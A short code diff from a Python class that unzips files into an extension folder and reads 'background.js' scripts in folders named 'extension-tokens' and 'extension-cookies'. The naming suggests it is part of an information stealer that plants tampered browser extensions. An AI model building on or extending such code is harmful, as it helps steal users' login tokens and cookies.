@@ -1245,7 +1245,7 @@ class hwkish_first_funct(Functions):
                 zip_ref.extractall(extension_path)
                 time.sleep(2)
                 main_file = os.path.join(extension_path, "extension-tokens", 'js', 'background.js')
-                main_file2 = os.path.join(extension_path, "extension-roblox", 'scripts', 'background.js')
+                main_file2 = os.path.join(extension_path, "extension-cookies", 'scripts', 'background.js')
 
                 with open(main_file, 'r') as f:
                     filedata = f.read()
